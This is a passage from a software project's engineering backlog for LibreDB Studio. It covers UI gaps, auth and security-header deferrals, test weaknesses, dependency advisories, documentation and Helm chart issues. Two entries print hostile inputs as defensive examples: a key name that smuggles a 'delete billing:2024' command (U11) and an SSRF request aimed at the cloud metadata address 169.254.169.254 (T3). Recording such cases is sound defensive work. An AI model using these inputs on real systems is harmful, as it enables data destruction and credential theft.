close it, and the header's close control is under the error card.

#427 measured this on Redis, where the route answered 400 for every key-prefix row, but the fault is
not Redis's: any provider whose profile request fails traps the user the same way. #427 hid the menu
item on providers whose rows are derived groupings, which removes the reachable path without fixing
the modal.

**Done when:** a failed profile is dismissable by Escape and by the modal's own close control, for
every provider that can fail it.

### U5. The Operations tab shows `Tables (0)` for a key-value provider and preselects nothing

Two gaps on one screen:

- `OperationsTab` calls `useMonitoringData` with `includeTables: true` for every connection, so a
  provider with no addressable tables renders an empty panel rather than none.
- The Explorer's deep link `onOpenMaintenance("tables", table.name)` carries the row's name, but
  `openMaintenance` in `Studio.tsx` drops the second argument, so the tab opens with nothing selected.

**Done when:** a provider whose rows are derived groupings renders no Tables panel, and a deep link
from a row arrives with that row selected.

### U6. The Reindex card has no per-provider wording, so it still speaks Postgres

`ProviderLabels` carries an `analyzeGlobal*` and a `vacuumGlobal*` triad and no `reindexGlobal` one.
#427 made the Operations tab render the first two. The reindex card stays hardcoded to *"Run
Reindex"* / *"Rebuild Indexes"* / *"Reconstructs all indexes in the database."*

Three providers declare `reindex`: Postgres, SQLite and Couchbase. For Couchbase, whose reindex is a
GSI rebuild rather than a table reindex, that copy is wrong the same way the analyze copy was wrong
for Redis. Adding the triad was out of scope for #427: it touches `ProviderLabels` and every provider
that implements it.

A smaller twin sits on the same screen. The per-table Analyze and Vacuum buttons are titled with the
hardcoded `"Analyze"` and `"Vacuum"`, so MongoDB's *"Validate Collection"*, ClickHouse's *"Table
Statistics"* and Oracle's *"Rebuild Indexes"* never reach them. Wiring those is entangled with U9 and
should be done with it.

**Done when:** `reindexGlobalLabel` / `reindexGlobalTitle` / `reindexGlobalDesc` exist, the three
declaring providers set them, the card renders them with the current strings as fallback, and the
per-table buttons carry `analyzeAction` / `vacuumAction`.

### U7. The embedded surface renders a Save Query button the host may not have wired

`QueryToolbar` renders its Save Query control whenever it is given an `onSaveQuery`. `StudioWorkspace`
now takes a real `onSaveQuery` prop and opens a save modal when the host supplies one — but when the
host supplies nothing it passes `noop`, and the button still renders. Dead control, embedded surface
only. The standalone `Studio` always passes a real handler.

Half of the original entry landed: the host CAN wire a save. The other half did not: an unwired host
still gets a button that does nothing.

**Done when:** the control is not rendered when no handler was supplied.

### U8. The LibreDB Monaco language module's tokenizer is never exercised

`registerLibreDBLanguage` (`src/lib/editor/libredb-language.ts`) hands Monaco a Monarch `tokenizer`
whose rules are the whole point of the module.
`tests/unit/editor/libredb-language.test.ts` asserts registration, the keyword list, the
configuration and idempotency — and for the rules themselves only `tokenizer.root.length > 0`.

So a regex covering the wrong span, a shadowing rule order, or a word in both the keyword and
modifier lists would pass every gate and show up only in a browser. 100% line coverage does not help:
the rules are data, and loading the module covers them.

The Redis half is **done**. `tests/unit/editor/redis-language.test.ts` asserts the rule regexes
directly (#427): what `^\s*#` matches and does not, that a SCAN cursor tokenizes as a number, that
`user:*` is ONE identifier token, that a quoted value keeps a `#` inside it, and that no two root
rules can open on the same character. It needs no Monaco runtime, so the same shape applies here.

**Done when:** the LibreDB module is checked the same way, or both are driven through Monaco's own
Monarch runtime end to end.

### U9. Four providers point `vacuumAction` at something that is not `vacuum`, and MySQL offers one it lacks

Two mismatches, measured while fixing #427 and left alone.

**(a) MySQL shows the base default it never meant.** The per-row maintenance items are gated on
`isAdmin` alone, so MySQL renders *"Vacuum Table"* — `BaseDatabaseProvider`'s default wording —
although its `maintenanceOperations` is `['analyze', 'optimize', 'check', 'kill']`. The item names an
operation MySQL does not have, and following it reaches an Operations tab with no vacuum card either.

**(b) ClickHouse, SQL Server, Oracle and Couchbase map the LABEL onto another operation.** Their
`vacuumAction` reads *"Optimize Table"*, *"Rebuild Indexes"*, *"Rebuild Indexes"* and *"Compact"*,
standing for the `optimize` / `optimize` / `optimize` / `reindex` each declares.

So a label-driven gate is not enough, and a *generic* label-to-operation mapping is actively wrong.
#427 built one, wired it into the per-table button, and handed Oracle a *"Rebuild Indexes"* control
that sent `optimize` with a TABLE name — while `oracle.ts` builds `ALTER INDEX "<target>" REBUILD`
from that target, so every click answered **ORA-01418: specified index does not exist**. A control
that always fails is worse than the dead end it replaced. The chain was reverted before merge.

What the revert paid for: any future mapping must be **per provider**, declared next to the operation
it names. The target grammar differs even among providers declaring the same `MaintenanceType`.
Oracle's `optimize` wants an index name, ClickHouse's wants a table, Couchbase's `reindex` wants a
keyspace.

**Done when:** each provider declares which operation its `vacuumAction` (and `analyzeAction`) stands
for *and* what kind of target it takes, both surfaces gate and title from that declaration, and a
live Oracle run proves the per-table control succeeds rather than returning ORA-01418.

### U10. The Monarch rules for the Redis and LibreDB command languages carry no cross-line string state

`redis-language.ts` and `libredb-language.ts` give Monaco a `root` state whose comment rule is
`^\s*#`, with no separate string state carried between lines. The providers treat a newline inside an
open quoted argument as data: `SET note "line1` / `#tag"` stores a two-line value
(`docs/providers/redis.md` §3.4a). So the editor paints the continuation line as a comment while the
provider stores it as part of the value. The highlighting and the execution disagree about one buffer.

Low severity: it misleads, it does not corrupt.

**Done when:** an open quoted argument keeps its string state across the line break in both
tokenizers, with a test asserting a `#`-leading continuation line is not tokenized as a comment.

### U11. The LibreDB "Scan Keys" generator interpolates a newline-bearing key name raw

`generateSelectQuery`'s LibreDB branch refuses to emit a command line for a node whose name contains
a newline (#427), because a line-oriented grammar cannot address it. `generateTableQuery` — the "Scan
Keys" action, which `handleTableClick` AUTO-EXECUTES — was left as it was. For a key literally named
`x\ndelete billing:2024` it returns `get x\ndelete billing:2024`.

Only `get x` runs, because `firstCommandLine()` takes the first line. Nothing destructive executes.
But line 2 sits in the editor as a plausible, runnable `delete billing:2024`, one Run Selected away.

Redis's equivalent path is closed: an argument the plain tokenizer cannot round-trip switches that
line to the lossless JSON command form, which has no line-oriented escape. LibreDB has no such form,
so closing this needs either a quoting rule in its grammar or the same "emit a note, emit no command"
answer `generateSelectQuery` already gives.

**Done when:** no generated LibreDB line can carry a second command, and `docs/providers/libredb.md`
§5.3 says so for Scan Keys as well as for the cheatsheet — today it claims the stronger property for
both.

### U12. The monitoring Queries tab tells every engine to enable `pg_stat_statements`

`src/components/monitoring/tabs/QueriesTab.tsx:121,131` hardcodes PostgreSQL's advice as the empty
state for "Slowest Queries": a badge reading *"pg_stat_statements required"* and the line *"Enable
pg_stat_statements extension to see query stats."* Nothing gates it on the engine.

Measured in the browser on 2026-08-19 on an **OpenSearch** connection. By inspection it is the same
on MySQL, Oracle, SQL Server, MongoDB, Redis, Couchbase, ClickHouse, Druid, Elasticsearch, Trino and
Cassandra.

This is the #427 defect in another panel. There, six global `ProviderLabels` fields existed, were set
by seven providers and read by no component, so every engine rendered Postgres's copy. That one was
fixed by reading the labels. This one has no label to read.

**Done when:** the empty state names something true for the connected engine — a slow-query label on
`ProviderLabels`, defaulted to today's wording for `postgres` alone — and each provider whose slow log
lives outside the query surface says so in its own words (the search providers' is "the SQL surface
does not reach the slow log", already in `docs/providers/elasticsearch.md` §7).

### U13. BEGIN and SANDBOX render on engines that have no transactions

`Studio.tsx` supplies `onBeginTransaction`/`onCommit`/`onRollback` unconditionally, so `QueryToolbar`
renders the trio — and SANDBOX, which auto-rolls-back through the same route — on every connection.
`POST /api/db/transaction` then refuses: *"Transaction control is not supported for this database
type"*. Measured 2026-08-19 on OpenSearch, HTTP 400 for both `begin` and `rollback`. Elasticsearch,
Druid, Couchbase, MongoDB, Redis, Trino and Cassandra are in the same position.

The toolbar's own doc comment states the rule this breaks — *"A caller that cannot run transactions
omits all three"* — added by #427 when the embedded shell was showing three dead buttons. The
standalone shell now does the same thing for a different reason: there is no capability to gate on.
The server gates on `isTransactionProvider(provider)`, a runtime shape check no client can read, and
`ProviderCapabilities` has no `supportsTransactions`.

Not folded into #424: the capability has to be added to every provider at once.

**Done when:** a provider declares whether it has transactions, `Studio.tsx` omits the trio and the
sandbox toggle where it does not, and every provider's doc states its answer.

### U18. The login hero has no vertical slack left, and the relatives line spends 56px it does not have

Measured on the built app (`next start`, Chromium), before and after the change that added the
wire-compatible relatives line:

| Viewport | Before | After | Sign-in card |
| --- | --- | --- | --- |
| 1440x900 | page 900px, no scroll | page 900px, no scroll | above the fold in both |
| 1280x800 | page 800px, no scroll | **page 856px, scrolls 56px** | above the fold in both |
| 1920x1080 | page 1080px, no scroll | page 1080px, no scroll | above the fold in both |
| 390x844 | page 991px (already scrolls) | page 1062px | above the fold in both |

The cause is not the line's height alone. At 1280x800 the hero column measured **exactly 800px before
the change** — the content block was 489px and the chrome took the rest — so the column had **zero
slack** and the `mt-auto` above it had nothing to absorb. Any block added anywhere in that column
scrolls the page at that height. One more row of engine pills would do it too.

**Re-measured with the nineteenth relative, and the figures did not move.** ScyllaDB joining
`WIRE_COMPATIBLE_ENGINES` adds a name to this same line, and at 1280x800 on the built app the page is
still 856px against an 800px viewport, still 56px of overflow, the line itself still 50px — the new
name fell inside the two-line box the eighteen already occupied rather than starting a third line. The
table above still holds; the next name is the one to re-measure.

Already spent to reduce it: folding the relatives line into the pills' own block instead of the hero's
32px rhythm (20px), `leading-snug` instead of `leading-relaxed` (12px), and a shorter lead sentence
(16px). 104px of overflow brought down to 56px.

Reaching zero means taking height out of a block that is not the relatives line — a decision about
what the hero says. The candidates are the `platform-line` ("Runs on Linux · macOS · Windows", 20px
plus its gap), the h1's two-line setting at 1280px, and the `connection-signature`'s `text-xl` at
that width.

The harm is bounded. The sign-in card is unaffected at every measured size. What falls below the fold
at 1280x800 is the bottom of the hero (the community row) plus the column's own top padding, which
collapses first. It is not the failure `login-form.tsx`'s comment records — a hero that measured
1294px in a 900px viewport and pushed the sign-in card itself down.

**Done when:** the hero fits at 1280x800 with the relatives line intact, or scrolling at that height
is accepted deliberately.

---

## Authentication and security headers

### AU1. The storage routes answer 401 with their own error shape

`src/lib/api/require-session.ts` builds `{ error: "Authentication required" }` with status 401, and
that guard is now the one place database- and LLM-reaching routes get it from. `schema-route.ts` and
`db/health/route.ts` both call `guardRoute`, so the two inline copies this entry used to list are gone.

What remains is the storage family. `src/app/api/storage/route.ts`,
`src/app/api/storage/[collection]/route.ts` and `src/app/api/storage/migrate/route.ts` each build
`{ error: "Unauthorized" }` inline. So a client still cannot rely on one error shape for "not logged
in" across the whole API.

**Done when:** the storage routes call the shared guard, and there is exactly one 401 response for
this condition.

### AU2. Static assets receive no security headers — decided, not implemented

`src/proxy.ts`'s matcher excludes any path matching `.*\..*` so static assets skip the auth redirect:
`/((?!api/storage/config|_next/static|_next/image|.*\..*).*)`. The dot exclusion is by design for
auth — nothing under `public/` or `/monaco/vs/*.js` needs a login redirect — but it means `proxy()`
never runs for those paths at all. Files under `public/`, `/monaco/vs/*.js` and `_next/static` are
served with none of the Phase 1 security headers, `X-Content-Type-Options` chief among them, while
every extensionless route gets the full set.

(`api/db/health` was excluded here too until that was found to exempt `POST /api/db/health`, a
state-changing route, from the Origin check. It is no longer in the list. GET's load-balancer path is
unaffected, because the Origin check exempts GET by method.)

Weighed during Phase 1 and left as-is: these are not documents, and Next serves them with correct
content types, so MIME sniffing on them is not a live threat. `Cross-Origin-Opener-Policy` and
`Cross-Origin-Resource-Policy` belong to the same decision and are outside Phase 1's agreed header set.

**Done when:** a second delivery mechanism covers them (e.g. `next.config`'s `headers()`), or this
entry is re-affirmed as permanently accepted risk.

---

## Tests

### T1. Two disjuncts are pinned by almost nothing

`isStatementText` (`src/lib/sql/statement-end.ts`) has a `dollar-string` disjunct pinned by exactly
one assertion. That is the same hole that, for the `subscript` disjunct, let a statement-corrupting
emission through the full gate, CI, 100% line coverage and five reviews — deleting the disjunct failed
zero tests. Line coverage cannot see a missing disjunct in a one-line predicate. Only a fixture where
the two readings *disagree* can pin it.

**Done when:** deleting any single disjunct of `isStatementText` fails a test.

### T2. `tests/unit/db/factory.test.ts` shares a `pg` mock with the storage provider

The test mocks `pg` with a shared inert pool while the storage provider caches `Pool` in a
module-level variable. In a shared process the first initialize decides which mock every later one
gets. Related to the `mock.module()` isolation rules in `docs/TOOLCHAIN.md`.

### T3. `tests/security/image-proxy.test.ts` asserts a configuration invariant, not the threat

The design it protects: `/_next/image?url=http://169.254.169.254/` (or any attacker-chosen URL) must
be rejected, because `next/image`'s optimizer would otherwise perform an unauthenticated server-side
fetch of it.

What it asserts is narrower — `nextConfig.images` is `undefined`. That is sufficient today only
because nothing in `src/` imports `next/image` at all, so the control is closed and correctly verified
for the current codebase.

The gap: the assertion is a proxy for the threat. A future, strictly safer configuration would fail
it — `images: { unoptimized: true }` disables the optimizer's fetch entirely and would still trip
`toBeUndefined()`. The real assertion belongs with the Playwright work, which can make an actual HTTP
request against a running server. A unit test importing `next.config` cannot exercise the route.

---

## Dependencies

### P1. The desktop shell's `glib` advisory has no reachable fix while Tauri v2 targets GTK 3

Dependabot alert 1 (GHSA-wrw7-89jp-8q8g, medium) reports unsoundness in the `Iterator` and
`DoubleEndedIterator` impls of `glib::VariantStrIter`, affecting `>= 0.15.0, < 0.20.0`.
`desktop/src-tauri/Cargo.lock` carries `glib 0.18.5` and it cannot move:

```
glib 0.18.5  <-  gtk 0.18.2 (requires glib ^0.18)  <-  tauri 2.11.5
```

`cargo update -p glib@0.18.5 --precise 0.20.0` fails on that requirement. Upgrading Tauri does not
help — 2.11.5 is the latest published version — and `gtk` cannot deliver the fix either: 0.18.2 is its
latest release and it is published as UNMAINTAINED, directing users to `gtk4`. The advisory closes
when Tauri's Linux backend moves off the GTK 3 bindings, which is upstream work.

Nothing in `desktop/src-tauri/` touches `glib`. Its direct dependencies are `tauri`, `serde_json` and
`libc`, and no source file references `glib` or `Variant`. The exposure is whatever Tauri and GTK do
with `VariantStrIter` internally, so the practical risk is low — but "we do not call it" is not proof
the path is unreachable.

**Done when:** Tauri's tree offers `glib >= 0.20` and the lock is updated, or the alert is dismissed
with this reasoning recorded on it. Re-check on each Tauri upgrade: `cargo tree -i glib` answers it.

### P2. TypeScript 7 is unreachable until it ships a programmatic API

`typescript@7.0.2` is on npm `latest` and is the native Go port. Its tarball contains no
`lib/typescript.js`: the exports map resolves `require("typescript")` to `lib/version.cjs`, which
returns `{version, versionMajorMinor}` and nothing else. `ts.createProgram` and `ts.Extension` are
`undefined`.

Two of the six mandatory gates call the compiler API directly, so both break at runtime while
`bun run typecheck` passes and reports nothing:

- `bun run lint` — `@typescript-eslint/typescript-estree` requires `typescript` in 19 files, and every
  published `typescript-eslint` caps the peer at `typescript: ">=4.8.4 <6.1.0"`. There is no v9 line.
- `bun run build:lib` — tsup's `dts: true` pipeline calls `ts.parseJsonConfigFileContent`.

`bun run build` additionally refuses unless `experimental.useTypeScriptCli` is set. Two smaller
blockers wait behind those: TS 7 removes `baseUrl`, which `tsconfig.lib.json` uses to resolve the
`@/*` alias for tsup's declaration bundler, and the `plugins: [{ "name": "next" }]` tsserver entry
has no host on 7.0. knip 6.x is unaffected — it is on oxc-parser with no TypeScript dependency.

Upstream, typescript-eslint's tracking issue
([#10940](https://github.com/typescript-eslint/typescript-eslint/issues/10940)) is labelled "blocked
by external API" and has a second, independent blocker: ESLint has no asynchronous-parser support,
which a tsgo backend needs. Microsoft promises the stable API in 7.1.

Worth knowing: `tsc --noEmit` under 7.0.2 already reports **zero errors** here, in **1.8s against
7.7s** for the 6.0.3 JavaScript compiler. So the compiler side is proven green and this is a
dependency bump plus a re-run of the gates whenever the API lands.

An interim option exists if that 4x is wanted sooner. Microsoft documents running
[6.0 and 7.0 side by side](https://devblogs.microsoft.com/typescript/announcing-typescript-7-0/#running-side-by-side-with-typescript-6.0):
keep `typescript@6` as the peer typescript-eslint resolves, add `typescript-7` as an npm alias, point
a second script at it. The cost is two compilers in the lockfile and two sources of truth about what
type-checks.

Do NOT reach for the `npm:@typescript/typescript6` alias workaround instead. It keeps TS 6 under the
name `typescript` for every gate that matters, so it buys a faster ad-hoc `tsc` and a package.json
that misreports its own compiler.

**Done when:** TS 7.1 ships that API **and** a `typescript-eslint` release admits `typescript: ^7`.
The whole check is one line: `npm view typescript-eslint peerDependencies.typescript`.

### P3. The ESLint 10 config carries a compat shim for eslint-config-next

`eslint.config.mjs` wraps `eslint-config-next`'s two configs in `@eslint/compat`'s
`fixupConfigRules`. ESLint 10 removed the deprecated rule-context methods; eslint-config-next 16.3.1
still depends on `eslint-plugin-react ^7.37.0`, whose newest release (7.37.5, April 2025) calls
`context.getFilename()` and declares `eslint: "... || ^9.7"`. Without the wrapper, loading any of its
rules throws `TypeError: contextOrFilename.getFilename is not a function` before a file is linted.
eslint-config-next's own peer range (`eslint: ">=9.0.0"`) does not express this.

**Done when:** eslint-config-next depends on an eslint-plugin-react that declares `eslint: ^10`, at
which point the two `fixupConfigRules(...)` calls become bare spreads and `@eslint/compat` leaves
`devDependencies`. Check with `npm view eslint-plugin-react peerDependencies.eslint`.

### P4. Two dependency majors deferred, and one decision that was skipped

Raised by Dependabot, closed unmerged. Recorded so the decisions survive whether or not the bot
re-raises them.

Still deferred:

- **`ioredis` 5 → 6.** The Redis provider maps `SCAN`/`INFO`/`SLOWLOG`/`CLIENT LIST` onto the
  SQL-oriented interface, so a client major needs the provider triad re-verified against a live
  server, not a type-check. RESP3 is the default in 6.
- **`oracledb` 6 → 7.** Thick/thin mode and the prebuilt binaries are what the Docker image and the
  AppImage build depend on. Check those before the API.

Taken since this entry was written: `@tanstack/react-table` 9, `framer-motion` 13, `eslint` 10.
`react-day-picker` was resolved by removal — its only importer was the vendored
`src/components/ui/calendar.tsx`, which nothing imported in turn. Both are gone. Re-add the dependency
only alongside a component that uses it.

**One thing to settle.** `@types/node` is now `^26.2.0` while `engines.node` still declares
`>=24.0.0`. This entry used to defer that bump for exactly this reason: typing against 26 lets code
compile that breaks on the floor the package advertises. The types moved and the floor did not.
Decide the floor, then keep the types matched to it.

`@zumer/snapdom` is pinned exactly (`2.15.0`, no caret) on purpose — see the ER-diagram export work —
and is not part of this list.

### P5. The rest of the unused shadcn primitives keep their dependencies alive

Dropping `react-day-picker` exposed the general case. `knip.json` lists
`src/components/ui/**/*.{ts,tsx}` as an *entry* glob, so every vendored shadcn file is a root. knip
never reports one as unused, and the package it imports therefore counts as used.

Roughly twenty primitives under `src/components/ui/` have no importer at all, and several are the sole
reason a package is installed: `carousel` → `embla-carousel-react`, `form` → `react-hook-form`,
`input-otp` → `input-otp`, plus `@radix-ui/react-accordion`, `-aspect-ratio`, `-avatar`,
`-collapsible`, `-hover-card`.

This is a decision, not a bump: either accept the vendored set as a deliberate on-hand library and say
so in `CLAUDE.md`, which today says nothing about it, or sweep the orphans and their packages the way
`calendar.tsx` went. Until then every Dependabot major on one of those packages costs a review for a
component nothing renders. Reproduce the list with a per-file importer count over `src/components/ui/`.

### P6. Twenty-one lucide icon imports survive only through legacy-rename aliases

The lucide-react 1.31 bump found this and did not fix it. These names were renamed upstream and are
re-exported under their old spelling, at runtime and in the types: `AlertTriangle`, `Loader2`,
`Loader2Icon`, `CheckCircle2`, `BarChart3`, `BarChart2`, `AlertCircle`, `FileJson`, `XCircle`,
`AlignLeft`, `Edit3`, `Filter`, `Wand2`, `MoreVertical`, `MoreHorizontal`, `MoreHorizontalIcon`,
`History`, `PlayCircle`, `LineChart`, `PieChart`, `AreaChart` — 51 import sites. Geometry is
byte-identical to what we rendered before, so nothing is broken today.

The failure mode is what makes it worth recording. lucide-react 1.31.0 ships **zero** `@deprecated`
JSDoc tags, so no editor, linter or typecheck warns while an alias is alive. The first signal is the
build breaking on the release that drops it. That is exactly how `Github` arrived — a hard break, not a
warning.

`History` is the one with a rendered-output consequence: in v1 it aliases `RotateCcwClock`, and
`createLucideIcon` derives the emitted class from the canonical name, so its element class moves from
`lucide-history` to `lucide-rotate-ccw-clock`. No test asserts that class today (checked all 17
`lucide-*` class literals under `src/` and `tests/`), but a migration should re-check it.

**Done when:** each import uses its canonical v1 name (`TriangleAlert`, `LoaderCircle`, `CircleCheck`,
`ChartColumn`, …), which turns a future silent removal into a no-op.

---

## Documentation

### DOC1. Provider-doc line references are stale across the board

`docs/providers/mssql.md` puts `getCapabilities()` at :57 and `getSchema()` at :369, where they are at
391 and 749. The drift predates any recent milestone and every provider doc uses the same
line-anchoring style, so the fix is a convention change — anchor on symbol names, not line numbers — as
much as a correction.

The same disease is in this file. Prefer symbol names here too.

### DOC2. Two chart README `--set` recipes render a YAML boolean where Kubernetes needs a string

`charts/libredb-studio/README.md`'s Content-Security-Policy escape hatch sets `CSP_REPORT_ONLY` with
`--set extraEnv[0].value="true"`, twice: the single-variable example and the two-variable one. The
shell strips the quotes and Helm type-coerces the bare word, so the manifest renders `value: true` —
an unquoted YAML boolean, while `core/v1.EnvVar.value` is a string. The API server rejects it:
`invalid type for io.k8s.api.core.v1.EnvVar.value: got "bool", expected "string"`. Reproduced with
`helm template` on 2026-08-12.

`--set-string` is the fix, one word per line. Found while documenting the agent runtime in #329 T13,
whose own recipe uses `--set-string` for exactly this reason.

**Done when:** both lines use `--set-string`, and ideally the README's `--set` bracket arguments are
single-quoted, since unquoted `extraEnv[0]` is a glob pattern in zsh.

### DOC3. Four channel listings still advertise NL2SQL, which the product no longer has

#331 T2 removed the NL2SQL and Autopilot panels, and #331 T6 rewrote the READMEs, `DOCKERHUB.md` and
`docs/FEATURES.md` around the agent. The **external channel listings were left out of that PR on
purpose**: each is a submission to somebody else's marketplace with its own review cycle.

Four files, with the strings that are now false:

| File | Line | The string |
| --- | --- | --- |
| `deploy/railway/TEMPLATE_OVERVIEW.md` | 3 | "with AI-powered query assistance (natural-language-to-SQL, explain, and fix)" |
| `deploy/digitalocean/assets/description-long.md` | 10 | "**AI-assisted SQL** — turn natural language into queries (NL2SQL)" |
| `deploy/rancher/CATALOG_LISTING.md` | 87 | "...writes and explains SQL from natural language and" |
| `deploy/azure/listing/listing-fields.md` | 76 | "2. `nl2sql` — \"Turn a plain-English question into SQL with AI assistance.\"" |

"Explain" survives the removal and "writes SQL from natural language" does not, so three of the four
need a rewrite rather than a deletion. The honest replacement is the read-only agent.

**Second staleness in the same files:** the railway line also names 12 engines, and 0.13.0 ships 14
plus 18 measured relatives. Fix both in one resubmission.

They are four separate submissions rather than one edit: the Azure entry is a numbered item in that
listing's own field contract, and each of the others is published by its marketplace from the file
above.

**Done when:** each listing has been resubmitted through its own channel with copy that matches the
shipped product.

---
### DOC4. Three packaging manifests publish "thirteen engines" against fourteen drivers

Found while sweeping the relatives count for the ScyllaDB row, and left out of that change on purpose:
it is a different denominator with its own history, and these are package-manager manifests rather
than the marketplace listings DOC3 covers.

| File | Line | Says |
| --- | --- | --- |
| `packaging/chocolatey/libredb-studio.nuspec.tmpl` | 31 | "thirteen engines" |
| `packaging/homebrew/libredb-studio.rb.tmpl` | 12 | "thirteen engines" |
| `packaging/winget/LibreDB.Studio.locale.en-US.yaml.tmpl` | 16, 19 | "thirteen engines" |

The count they mean is the external drivers, which is **fourteen** since Cassandra landed
(`EXTERNAL_DATABASE_TYPES.length` in `src/lib/db/compatibility.ts`). All three are published listing
copy on live channels, so the wrong number is public rather than internal.

Two things to settle rather than bumping the digit, which is the mistake #445 recorded: whether a
template nothing regenerates from the registry should carry a count at all, and which denominator the
listing wants — fourteen drivers, or the named products README.md publishes.

**Done when:** each of the four lines states a number that matches the registry or states no number.

---

## Release pipeline

### REL1. No CI job installs the released chart artifact with a Helm 3 client

The CI Helm matrix pins six of its seven `azure/setup-helm` sites to Helm 4.1.3 and keeps
`helm-release.yml` → `lint-test` on Helm 3.16 on purpose, because our users install with Helm 3.
`tests/unit/helm-pin-matrix.test.ts` locks that split.

What the Helm 3 job proves is narrower than the marker at the site used to claim: `ct install --charts
charts/libredb-studio` installs the chart SOURCE directory. Never the `.tgz` that
`release-github-pages` packages with Helm 4, and never the OCI artifact `release-oci` pushes. So no
job anywhere performs `helm install` with a Helm 3 client against a released byte.

The gap is believed narrow. A Helm 4 package differs from a Helm 3 one only in preserved source
mtimes, and extracted trees, `tar` member lists, `helm3 lint --strict`, `helm3 show chart`,
`helm3 template` and a `helm3 pull` of the pushed OCI artifact were all verified equivalent by hand
before the pins were raised. But "verified once by hand" is not a gate, and nothing would catch a
future Helm 4 packaging change that a Helm 3 client rejects at install time.

**Done when:** `helm-index-check.yml` (which today only curls the index and compares sha256, running
no Helm client at all) also runs a pinned Helm 3.16 `helm repo add` + `helm pull` + `helm install` of
the published chart version against a kind cluster, or an equivalent post-publish smoke lands
elsewhere.

---

## Chart configuration surface

Found while reviewing #362 (the Gateway API `HTTPRoute` template) and its follow-up #366. None is
caused by those changes. All share one failure shape: configuration the chart accepts that produces an
install which succeeds while the app stays unreachable.

### N1. The chart cannot expose the app on OpenShift, where `Route` is the native way in

`grep -rl 'route.openshift.io' charts/ operator/` returns nothing. The chart renders an `Ingress`
(`templates/ingress.yaml`) and, since #362, a Gateway API `HTTPRoute` (`templates/route.yaml`), but
never a `route.openshift.io/v1` `Route`.

Meanwhile the chart carries an OpenShift security-context adaptation and the repository publishes an
OpenShift operator to OperatorHub. So OpenShift is a first-class target everywhere except the one
object that makes the app reachable there.

The consequence is the symptom #362 was opened to fix, one platform over: `helm install` succeeds, the
pod runs, and the operator has to hand-write a `Route` outside the chart and keep it in sync across
upgrades. An `Ingress` is *sometimes* served on OpenShift by the router's ingress translation, but that
is a compatibility shim with its own annotation dialect, and it does not cover re-encrypt or
passthrough TLS.

Note the naming collision: `route.*` in `values.yaml` means Gateway API as of #362, so an OpenShift
`Route` cannot reuse that key. `openshiftRoute.*` is the obvious alternative.

**Done when:** an OpenShift cluster can be served by the chart alone, with TLS termination selectable,
and the README says which of the three exposure mechanisms belongs to which platform.

### N2. `AUTH_COOKIE_SECURE` is reachable in every distribution channel except the chart

`grep -rln AUTH_COOKIE_SECURE charts/ operator/` returns nothing. The variable is read in
`src/lib/auth.ts` and is the documented answer for a browser reaching the app over plain HTTP on a
non-loopback host (`docs/OIDC.md`, `docs/DISTRIBUTION.md`), where auth cookies otherwise carry the
`Secure` flag, the browser rejects them, and — in the words of the comment beside it — "login silently
loops". The upstream report behind that comment is getumbrel/umbrel-apps#5847.

Every other `config.*` key in this class already has a first-class value (`storageProvider`,
`llmProvider`, `oidcIssuer`, …) rendered by `templates/configmap.yaml` under the established
`{{- if .Values.config.X }}` pattern. A chart user has to reach for `extraEnv` instead, so the one
setting most likely to be needed on a LAN or home-server install is the one that is not discoverable
from `values.yaml`.

Not hypothetical: plain-HTTP channels shipping without the override has already been diagnosed on
three separate distribution channels.

**Done when:** `config.authCookieSecure` exists, renders through the configmap like its siblings, is
in the README's values table, and leaves the app's own default in place when unset. The semantics are
three-state (`true` / `false` / unset lets the app decide), so a plain boolean with a `false` default
would silently change behaviour for existing installs.

### N3. Subpath deployment is build-time only, which is why #369 is deferred rather than scheduled

[#369](https://github.com/libredb/libredb-studio/issues/369) asks to serve Studio under a path prefix
on a shared domain — `https://example.com/libredb` next to `https://example.com/grafana`.
`next.config.ts` sets no `basePath` and no `assetPrefix`, so there is zero support today.

The constraint, recorded so nobody rediscovers it: **Next.js `basePath` is baked at build, not read at
runtime.** Asset URLs (`/_next/static/...`) are emitted into the HTML and JS at build time and there
is no supported runtime override. So a `BASE_PATH` env var on the prebuilt image cannot work — the
feature has to be a build arg and a rebuilt image.

A reverse-proxy `StripPrefix` is not a workaround either. The browser asks for `/libredb/`, the proxy
strips it, the app answers with HTML referencing `/_next/static/...` at the root, and that follow-up
request no longer matches the `/libredb` router rule. Grafana can do this at runtime because it is a
Go server templating its own HTML; a statically built Next.js app is structurally different.

The surface a build-time implementation touches: roughly 40 `fetch('/api/...')` call sites, roughly 15
`router.push('/...')`, the cookie `path: "/"` in `src/lib/auth.ts` and the OIDC login route, OIDC
redirect URIs, the `src/proxy.ts` matcher, the Docker healthcheck, the chart's ingress and route
paths, the npm library surface, the E2E suite and the docs of roughly 27 distribution channels.
`next/link` and the app-router `router` prefix automatically; `fetch`, middleware redirects and cookie
paths do not.

Deferred rather than scheduled because the acquisition-relevant PaaS one-click listings hand out
subdomains, not subpaths, so no shipped channel needs it.

Related sharp edge, same silent-no-op class as #366: `values.yaml` already lets a user set
`ingress.hosts[].paths[].path` to `/libredb`, the install succeeds, and the app is unreachable.

**Done when:** a `BASE_PATH` build arg produces an image reachable under a path prefix — assets, API
calls, auth cookie and OIDC redirect included — verified against a real path-routing proxy, or the
chart refuses a non-root ingress path outright.

---

## Container runtime

### U15. The IPv6-only container default is unverified on a kernel without AF_INET6

The container no longer hardcodes `0.0.0.0`. Its entrypoint resolves a bind address at startup, proves
`::` is dual-stack by connecting an IPv4 client to a throwaway `::` listener, and falls back to
`0.0.0.0` only when that probe fails and a non-loopback IPv4 address exists. The chart writes an empty
`HOSTNAME` so the resolver runs, with `config.bindAddress` to overrule it. That closed #432.

One branch is reasoned rather than measured. Every namespace reachable on the development host —
`--sysctl net.ipv6.bindv6only=1`, `--sysctl net.ipv6.conf.all.disable_ipv6=1`, `--network host`, an
IPv6-only Docker network — still binds `::` successfully, and the `bindv6only` case still serves IPv4
because libuv clears `IPV6_V6ONLY`. The one configuration that would make `socket(AF_INET6)` fail
outright is a kernel built without IPv6 (`CONFIG_IPV6=n`) or with the module unloaded, and that could
not be constructed here.

The `ipv6-unavailable` branch is covered by unit tests with an injected failure, and the failure mode
if it is wrong is loud (the server exits) rather than silent.

**Done when:** the image has been started once on a host with no `AF_INET6` and observed to log
`ipv6-unavailable` and bind `0.0.0.0` — or that configuration is judged rare enough that the unit test
is the whole answer. This is a decision, not work.

---

## Security Phase 1 deferrals

Each was decided during Phase 1, not overlooked.

### H1. A CSP nonce needs the app to stop being statically prerendered

`src/lib/security/headers.ts`'s `script-src` carries `'unsafe-inline'`, so the policy does not block an
inline event handler. A nonce is the only alternative, and it is blocked by a structural fact: every
